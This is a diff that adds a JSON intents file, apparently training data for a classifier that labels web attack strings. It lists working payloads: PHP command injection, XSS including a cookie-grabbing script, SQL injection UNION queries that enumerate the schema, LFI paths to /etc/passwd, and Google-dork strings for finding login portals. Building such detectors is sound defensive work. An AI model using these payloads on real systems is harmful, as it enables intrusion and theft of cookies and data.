@@ -1,0 +1,30 @@
+{"intents":
+    [
+      {
+        "tag":"phpinjection",
+        "input":["/index.php?arg=1; phpinfo()", "/index.php?arg=1; system('id')"],
+        "responses":["Code Injection PHP"]
+        },
+        {
+          "tag":"portallogin",
+          "input":["inurl:/doc/page/login.asp?", "inurl:/sap/bc/webdynpro/ logon", "intitle:'ST Web Client'"],
+          "responses":["Pages Containing Login Portals"]
+        },
+        {
+          "tag":"xsscodevuln",
+          "input":["<input type='search' value='' />","<input type='search' value='' /><scriptStealCrendetial()</script>' />", "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>", "<script>alert('XSS')</script>", "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>"],
+          "responses":["XSS"]
+        },
+        {
+          "tag":"Sqlinjection",
+          "input":["'UNION SELECT NULL,NULL,NULL -- -", "'UNION SELECT NULL,NULL,NULL FROM DUAL -- -", "' UNION SELECT @@version -- -", "' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -", "' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='X' -- -", "' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -"],
+          "responses":["SQL INJECTION"]
+        },
+        {
+          "tag":"lfi",
+          "input":["foo.php?file=../../../../../../../etc/passwd", "/example1.php?page=expect://ls", ""],
+          "responses":["LFI"]
+        }
+
+    ]
+  }
